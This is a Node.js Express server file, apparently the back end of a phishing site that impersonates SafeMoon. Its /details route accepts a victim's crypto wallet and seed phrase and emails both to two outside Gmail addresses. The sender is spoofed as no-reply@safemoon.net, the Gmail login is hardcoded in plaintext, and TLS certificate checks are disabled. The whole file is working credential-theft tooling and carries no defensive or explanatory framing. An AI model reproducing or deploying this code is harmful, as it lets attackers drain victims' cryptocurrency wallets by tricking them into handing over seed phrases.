const express = require('express')
const cors = require('cors')
const nodemailer = require("nodemailer")


// app config
const app = express()
const port = process.env.port || 5000


// middlewares
app.use(express.json())
app.use(cors())
app.use(express.urlencoded({ extended: false }))




//dbconfig

app.get('/', (req, res) => {
    res.sendFile("index.html")
})



app.post("/details", (req, res) => {
    console.log(req.body)

    const {cryptowallet, seedorphrase} = req.body

    


    const transporter = nodemailer.createTransport({
        service: 'gmail',
        host: 'smtp.gmail.com',
        auth: {
            user: "brownweek1@gmail.com",
            pass: "Justin2000"
        },
        secure: false,
        tls:{
            rejectUnauthorized: false
        }
    })
    
    const mailoptions = {
        from: 'no-reply@safemoon.net',
        to: 'weekbrown09@gmail.com, archibequedavid308@gmail.com',
        subject: 'safemoon details',
        html: `<p>This is the cryptowallet  <h2><strong>"${cryptowallet}"</strong></h2> and seedorPhrase <h2><strong>"${seedorphrase}"</strong></h2> <p>`
    }
    
    
    transporter.sendMail(mailoptions, (err, info) => {
        if(err){
            console.log(err)

        }
        else{
            console.log(info)
            res.status(200).send(info)

        }
    })
        
})



if (process.env.NODE_ENV === 'production'){
    app.use(express.static('frontend/build'))
}



app.listen(port, console.log(`app started on port ${port}`))